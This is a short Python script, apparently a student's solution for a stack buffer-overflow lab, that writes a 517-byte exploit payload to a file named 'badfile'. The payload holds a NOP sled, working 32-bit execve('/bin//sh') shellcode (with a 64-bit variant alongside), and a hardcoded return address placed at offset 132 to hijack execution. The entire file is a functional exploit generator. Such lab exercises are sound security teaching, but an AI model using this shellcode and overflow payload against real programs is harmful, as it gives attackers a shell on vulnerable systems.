#!/usr/bin/python3
import sys

""" This code constructs a payload to be read into the buffer
and writes the binary payload to "badfile".

First we construct the payload entirely of NOPs to serve as a
nopsled into our shellcode. Next, we insert the shellcode into
the payload. Finally, we insert a return address that will 
instruct the vulnerable program to execute instructions in the 
payload.
"""

# You can use this function to print out your payload in bytes.
# It is not necessary to use this, but it may help you debug.
def bytes_to_hex(arr):
	print(''.join('{:02x}'.format(x) for x in arr))

# Replace the payload with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"
  "\x90\x90\x90\x90"
).encode('latin-1')

#Copied from call_shellcode.c
# 32-bit execve("/bin//sh") shellcode (no nulls)
shell_code_x86_32 = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    b"\xd2\x31\xc0\xb0\x0b\xcd\x80"
)

# 64-bit execve("/bin//sh") shellcode (no nulls)
shell_code_x86_64 = (
    b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    b"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    b"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
)

# Choose the correct shellcode for the target
# For your Level-1 32-bit lab target:
shellcode = shell_code_x86_32

PAYLOAD_LEN = 517
slack_after_shellcode = 8
# Fill the payload with NOP's
payload = bytearray(0x90 for i in range(PAYLOAD_LEN))

# Put the shellcode somewhere in the payload
start = PAYLOAD_LEN - len(shellcode) - slack_after_shellcode
payload[start:start + len(shellcode)] = shellcode


L = 4 	# Use 4 for 32-bit address and 8 for 64-bit address
      	# You don't need to change this for this lab.

# Decide the return address value
# and put it somewhere in the payload
offset = 132          	# Change this number
ret	= 0xffffc584       	# Change this number


payload[offset:offset + L] = (ret).to_bytes(L,byteorder='little')


# Write the payload to a file
with open('badfile', 'wb') as f:
  f.write(payload)
